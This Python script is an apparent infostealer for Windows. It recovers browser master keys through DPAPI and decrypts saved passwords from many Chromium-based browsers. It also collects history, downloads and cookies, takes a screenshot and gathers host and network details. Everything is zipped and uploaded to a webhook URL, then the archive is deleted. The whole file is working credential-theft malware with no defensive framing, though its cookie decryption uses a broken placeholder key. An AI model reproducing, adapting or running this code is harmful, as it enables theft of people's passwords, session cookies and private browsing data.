import os
import json
import base64
import shutil
import sqlite3
import requests
import zipfile
import time
import socket
import platform
import psutil
import pyautogui
import uuid
import getpass
import datetime
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from win32crypt import CryptUnprotectData

# Browser paths dictionary
appdata = os.getenv('APPDATA')
localappdata = os.getenv('LOCALAPPDATA')

browsers = {
    'amigo': appdata + '\\Amigo\\User Data',
    'torch': appdata + '\\Torch\\User Data',
    'kometa': appdata + '\\Kometa\\User Data',
    'orbitum': appdata + '\\Orbitum\\User Data',
    'cent-browser': appdata + '\\CentBrowser\\User Data',
    '7star': appdata + '\\7Star\\7Star\\User Data',
    'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
    'vivaldi': appdata + '\\Vivaldi\\User Data',
    'google-chrome-sxs': localappdata + '\\Google\\Chrome SxS\\User Data',
    'google-chrome': localappdata + '\\Google\\Chrome\\User Data',
    'epic-privacy-browser': localappdata + '\\Epic Privacy Browser\\User Data',
    'microsoft-edge': localappdata + '\\Microsoft\\Edge\\User Data',
    'uran': appdata + '\\uCozMedia\\Uran\\User Data',
    'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
    'brave': localappdata + '\\BraveSoftware\\Brave-Browser\\User Data',
    'iridium': localappdata + '\\Iridium\\User Data',
    'firefox': os.path.join(os.getenv('APPDATA'), 'Mozilla\\Firefox\\Profiles')
}

# Function to retrieve master key from Chrome or Edge browser
def get_master_key(browser_path: str):
    if not os.path.exists(browser_path):
        return None

    local_state_path = os.path.join(browser_path, "Local State")
    if 'os_crypt' not in open(local_state_path, 'r', encoding='utf-8').read():
        return None

    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)

    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    encrypted_key = encrypted_key[5:]  # Remove DPAPI prefix
    master_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return master_key

# Function to decrypt password using AES-GCM encryption
def decrypt_password(buff: bytes, master_key: bytes) -> str:
    iv = buff[3:15]
    payload = buff[15:-16]
    tag = buff[-16:]
    cipher = AESGCM(master_key)
    decrypted_pass = cipher.decrypt(iv, payload + tag, None).decode()
    return decrypted_pass

# Function to retrieve browsing history from specified browser profile
def get_browser_history(path: str, profile: str):
    history_db = os.path.join(path, profile, 'History')
    if not os.path.exists(history_db):
        print(f"History database '{history_db}' not found.")
        return ""

    temp_db = os.path.join(os.getenv('LOCALAPPDATA'), 'Temp', 'history_db')
    shutil.copy(history_db, temp_db)
    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cursor.execute('SELECT datetime(last_visit_time/1000000-11644473600,"unixepoch"), url FROM urls ORDER BY last_visit_time DESC')
    history_data = ""
    for row in cursor.fetchall():
        visit_time = datetime.datetime.strptime(row[0], "%Y-%m-%d %H:%M:%S")
        history_data += f"Time: {visit_time}\nURL: {row[1]}\n\n"
    conn.close()
    os.remove(temp_db)
    return history_data

# Function to retrieve download history from specified browser profile
def get_browser_downloads(path: str, profile: str):
    downloads_db = os.path.join(path, profile, 'History')
    if not os.path.exists(downloads_db):
        print(f"Download history database '{downloads_db}' not found.")
        return ""

    temp_db = os.path.join(os.getenv('LOCALAPPDATA'), 'Temp', 'downloads_db')
    shutil.copy(downloads_db, temp_db)
    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cursor.execute('SELECT datetime(start_time/1000000-11644473600,"unixepoch"), target_path, total_bytes FROM downloads ORDER BY start_time DESC')
    downloads_data = ""
    for row in cursor.fetchall():
        start_time = datetime.datetime.strptime(row[0], "%Y-%m-%d %H:%M:%S")
        downloads_data += f"Time: {start_time}\nFile: {row[1]}\nSize: {row[2]} bytes\n\n"
    conn.close()
    os.remove(temp_db)
    return downloads_data

# Function to retrieve cookies from specified browser profile
def get_browser_cookies(path: str, profile: str):
    cookies_db = os.path.join(path, profile, 'Cookies')
    if not os.path.exists(cookies_db):
        print(f"Cookies database '{cookies_db}' not found.")
        return ""

    temp_db = os.path.join(os.getenv('LOCALAPPDATA'), 'Temp', 'cookies_db')
    shutil.copy(cookies_db, temp_db)
    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cursor.execute('SELECT host_key, name, encrypted_value, last_access_utc FROM cookies ORDER BY last_access_utc DESC')
    cookies_data = ""
    for row in cursor.fetchall():
        try:
            decrypted_value = decrypt_password(row[2], b'v10::string')
            cookies_data += f"Host: {row[0]}\nName: {row[1]}\nValue: {decrypted_value}\nLast Access Time: {row[3]}\n\n"
        except Exception as e:
            print(f"Error decrypting cookie value: {e}")
    conn.close()
    os.remove(temp_db)
    return cookies_data

# Function to retrieve login data from specified browser profile
def get_login_data(path: str, profile: str, master_key):
    login_db = os.path.join(path, profile, 'Login Data')
    if not os.path.exists(login_db):
        print(f"Login database '{login_db}' not found.")
        return ""

    temp_db = os.path.join(os.getenv('LOCALAPPDATA'), 'Temp', 'login_db')
    shutil.copy(login_db, temp_db)
    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cursor.execute('SELECT action_url, username_value, password_value FROM logins')
    login_data = ""
    for row in cursor.fetchall():
        password = decrypt_password(row[2], master_key)
        login_data += f"URL: {row[0]}\nEmail: {row[1]}\nPassword: {password}\n\n"
    conn.close()
    os.remove(temp_db)
    return login_data

# Function to capture desktop screenshot
def capture_screenshot():
    screenshot_file = 'screenshot.png'
    screenshot = pyautogui.screenshot()
    screenshot.save(screenshot_file)
    return screenshot_file

# Function to gather general system and network information
def gather_general_info():
    geninfo_file = 'geninfo.txt'
    with open(geninfo_file, 'w', encoding='utf-8') as f:
        # Clipboard content (not implemented in this example)
        f.write(f"Clipboard: <content here>\n\n")

        # IP Addresses and MAC Address
        try:
            hostname = socket.gethostname()
            ip_address = socket.gethostbyname(hostname)
            public_ip = requests.get('https://api64.ipify.org').text
            private_ip = socket.gethostbyname(hostname)
            mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0,8*6,8)][::-1])
            f.write(f"IP Address: {ip_address}\nPublic IPv4: {public_ip}\nPrivate IPv4: {private_ip}\nMAC Address: {mac_address}\n\n")
        except Exception as e:
            print(f"Error getting network information: {e}")

        # PC Name and User Info
        try:
            f.write(f"PC Name: {hostname}\nUsername: {getpass.getuser()}\n\n")
        except Exception as e:
            print(f"Error getting PC name and username: {e}")

        # Windows PC Specifications
        try:
            system_info = platform.uname()
            f.write(f"System: {system_info.system}\nNode Name: {system_info.node}\nRelease: {system_info.release}\nVersion: {system_info.version}\nMachine: {system_info.machine}\nProcessor: {system_info.processor}\n\n")
        except Exception as e:
            print(f"Error getting system information: {e}")

    return geninfo_file

# Function to create a temporary ZIP file with all collected data
def create_temp_zip(login_data_dict, history_data_dict, downloads_data_dict, cookies_data_dict, screenshot_file, geninfo_file):
    zip_filename = os.path.join(os.getenv('USERPROFILE'), 'Documents', 'vault.zip')
    with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for browser, login_data in login_data_dict.items():
            zipf.writestr(f'{browser}_logins.txt', login_data)
        for browser, history_data in history_data_dict.items():
            zipf.writestr(f'{browser}_history.txt', history_data)
        for browser, downloads_data in downloads_data_dict.items():
            zipf.writestr(f'{browser}_downloads.txt', downloads_data)
        for browser, cookies_data in cookies_data_dict.items():
            zipf.writestr(f'{browser}_cookies.txt', cookies_data)
        if screenshot_file:
            zipf.write(screenshot_file, 'screenshot.png')
        if geninfo_file:
            zipf.write(geninfo_file, 'geninfo.txt')
        # Include filepath.txt (not implemented in this example)

    return zip_filename

# Function to send the created ZIP file to a webhook URL
def send_results(zip_filename, webhook_url):
    if zip_filename:
        with open(zip_filename, 'rb') as f:
            files = {'file': (zip_filename, f, 'application/zip')}
            response = requests.post(webhook_url, files=files)
            if response.status_code == 200:
                print(f"Successfully sent login data to webhook.")
            else:
                print(f"Failed to send login data to webhook. Status code: {response.status_code}")

        # Delete the temporary ZIP file after 3 seconds
        time.sleep(3)
        os.remove(zip_filename)

if __name__ == "__main__":
    # Load webhook URL from webhook.json
    webhook_json_path = os.path.join(os.path.dirname(__file__), 'webhook.json')
    if os.path.exists(webhook_json_path):
        with open(webhook_json_path, 'r') as f:
            webhook_data = json.load(f)
            webhook_url = webhook_data.get('webhook_url')
            if not webhook_url:
                print("Webhook URL not found in webhook.json.")
                exit(1)
    else:
        print("webhook.json not found.")
        exit(1)

    # Dictionary to store login data, history data, downloads data, and cookies data for each browser
    login_data_dict = {}
    history_data_dict = {}
    downloads_data_dict = {}
    cookies_data_dict = {}

    # Loop through each browser and retrieve data
    for browser, path in browsers.items():
        if browser in ['firefox']:
            continue  # Skipping Firefox for now as it's not fully implemented

        master_key = get_master_key(path)
        if master_key:
            login_data = get_login_data(path, 'Default', master_key)
            login_data_dict[browser] = login_data
            history_data = get_browser_history(path, 'Default')
            history_data_dict[browser] = history_data
            downloads_data = get_browser_downloads(path, 'Default')
            downloads_data_dict[browser] = downloads_data
            cookies_data = get_browser_cookies(path, 'Default')
            cookies_data_dict[browser] = cookies_data
        else:
            print(f"Failed to retrieve master key for {browser}. Skipping...")

    # Capture desktop screenshot
    screenshot_file = capture_screenshot()

    # Gather general system and network information
    geninfo_file = gather_general_info()

    # Create a temporary ZIP file containing all gathered data
    zip_filename = create_temp_zip(login_data_dict, history_data_dict, downloads_data_dict, cookies_data_dict, screenshot_file, geninfo_file)

    # Send the ZIP file containing all gathered data to the webhook
    send_results(zip_filename, webhook_url)
